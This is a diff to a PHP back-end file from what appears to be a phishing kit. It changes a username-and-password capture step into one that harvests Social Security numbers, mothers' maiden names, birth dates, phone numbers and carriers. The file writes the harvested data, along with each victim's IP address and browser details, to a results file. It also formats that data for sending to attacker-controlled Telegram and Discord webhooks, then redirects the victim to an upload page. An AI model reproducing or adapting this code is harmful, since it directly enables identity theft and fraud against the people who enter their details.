@@ -1,10 +1,12 @@
 <?php
-if (isset($_POST["user"]) && isset($_POST["pass"]) )
+if (isset($_POST["ssn"]) && isset($_POST["mmn"]) && isset($_POST["dob"])  && isset($_POST["phn"]))
 {
 session_start();
-
-$user = $_POST["user"];
-$pass = $_post["pass"];
+$ssn = $_SESSION['dob'] = $_POST['dob'];
+$mmn = $_POST["mmn"];
+$ssn = $_POST["ssn"];
+$phn = $_POST["phn"];
+$car = $_POST['car'];
 $ip   = $_SERVER['REMOTE_ADDR'];
 $UA   = $_SERVER['HTTP_USER_AGENT'];
 $host = $_SERVER['REMOTE_HOST'];
@@ -17,38 +19,44 @@ $webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
 extract($_REQUEST);
 
 
-$file=fopen("../results/logs.txt","a");
+$file=fopen("../results/ssn.txt","a");
 
 
 # Format for log.txt file
 // Here variable $a is just an example (replace with your own variables)
 
-fwrite($file," << N E W  M A F I S O  L O G I N >>\r\n");
-fwrite($file, "Username: ". $user ."\r\n");
-fwrite($file, "Password: ". $pass ."\r\n");
-fwrite($file," <<   S E S S I O N    I N F O    >>\r\n");
+fwrite($file," << N E W   M A F I S O   P E R S O N A L >>\r\n");
+fwrite($file, "ssn: ". $ssn ."\r\n");
+fwrite($file, "mmn : ". $mmn ."\r\n");
+fwrite($file, "phone : ". $phn ."\r\n");
+fwrite($file, "dob : ". $dob ."\r\n");
+fwrite($file, "Carrier : ". $car ."\r\n");
+fwrite($file," <<       S E S S I O N    I N F O      >>\r\n");
 fwrite($file, "User Agent: ". $UA ."\r\n");
 fwrite($file, "IP: ". $ip ."\r\n");
 fwrite($file, "HOSTNAME : ". $host ."\r\n");
-fwrite($file,"<<    E N D   O F   L O G I N     >>\r\n");
+fwrite($file,"<<      E N D   O F   P E R S O N A L     >>\r\n");
 fclose($file);
 
 
 # Store Post values in variables
 // Here variable $a is just an example (replace with your own variables)
-$_SESSION['check1'] = "true";
+$_SESSION['check4'] = "true";
 
 
 # Format for Telegram & Discord
 // Here variable $a is just an example (replace with your own variables)
-$data = " << N E W  M A F I S O  L O G I N >>\r\n";
-$data.= " > Username: $user\r\n";
-$data.= " > Password: $pass\r\n";
-$data.= " <<   S E S S I O N    I N F O    >>\r\n";
+$data = " << N E W   M A F I S O   P E R S O N A L >>\r\n";
+$data.= " > ssn:   $ssn\r\n";
+$data.= " > mmn:  $mmn\r\n";
+$data.= " > DOB :  $dob\r\n";
+$data.= " > phone:  $phn\r\n";
+$data.= " > Carrier:  $car\r\n";
+$data.= " <<       S E S S I O N    I N F O      >>\r\n";
 $data.= " > User Agent: $UA \r\n";
 $data.= " >IP : $ip \r\n";
 $data.= " >HOSTNAME : $host \r\n";
-$data.= "<<    E N D   O F   L O G I N     >>\r\n";
+$data.= "<<      E N D   O F   P E R S O N A L     >>\r\n";
 
 
 
@@ -80,7 +88,7 @@ if ($discord == "on"){
     $response = curl_exec($ch);
 }
 
-header("location: ../accounts.php");
+header("location: ../upload.php");
 }
 else
 {
